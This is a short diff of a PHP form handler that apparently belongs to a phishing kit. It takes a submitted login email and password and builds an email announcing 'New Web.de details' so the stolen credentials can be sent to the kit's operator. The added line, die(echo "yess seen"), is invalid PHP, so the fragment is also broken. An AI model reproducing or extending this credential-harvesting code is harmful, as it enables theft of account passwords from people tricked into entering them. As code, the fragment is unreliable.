@@ -1,7 +1,8 @@
 <?php
 if(isset($_POST['login'])) {
   extract($_POST); 
-
+die(echo "yess seen");
+  
   //send email
   $body="New Web.de details has been sent. \n\nEmail: $email \n Password: $password. \n\n Kind Regards";
 
